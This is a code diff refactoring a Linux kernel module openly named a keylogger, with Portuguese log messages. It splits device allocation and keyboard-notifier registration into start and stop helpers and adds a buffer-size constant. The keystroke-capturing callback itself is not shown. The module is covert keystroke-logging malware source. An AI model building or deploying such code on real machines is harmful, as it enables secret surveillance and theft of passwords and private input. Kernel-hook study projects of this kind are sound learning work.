@@ -3,6 +3,8 @@
 #include <linux/keyboard.h>
 #include <linux/input.h> 
 
+#define BUFFSIZE 32
+
 MODULE_LICENSE("GPL");
 
 static struct input_dev *input_dev;
@@ -24,7 +26,8 @@ static struct notifier_block keylogger_blk = {
     .notifier_call = keylogger_notify
 };
 
-static int __init keylogger_init(void) {
+static int start_keylogger(void){
+
     input_dev = input_allocate_device();
     if (!input_dev) {
         return -ENOMEM;
@@ -39,6 +42,23 @@ static int __init keylogger_init(void) {
         return -ENOMEM;
     }
 
+    return 0;
+    
+}
+
+static void stop_keylogger(void){
+
+    unregister_keyboard_notifier(&keylogger_blk);
+    input_unregister_device(input_dev);
+
+}
+
+static int __init keylogger_init(void) {
+    
+    if(start_keylogger()){
+        return -ENOMEM;
+    }
+
     register_keyboard_notifier(&keylogger_blk);
 
     pr_info("Módulo Keylogger carregado\n");
@@ -47,10 +67,11 @@ static int __init keylogger_init(void) {
 }
 
 static void __exit keylogger_exit(void) {
-    unregister_keyboard_notifier(&keylogger_blk);
-    input_unregister_device(input_dev);
 
+    stop_keylogger();
+    
     pr_info("Módulo Keylogger descarregado\n");
+
 }
 
 module_init(keylogger_init);
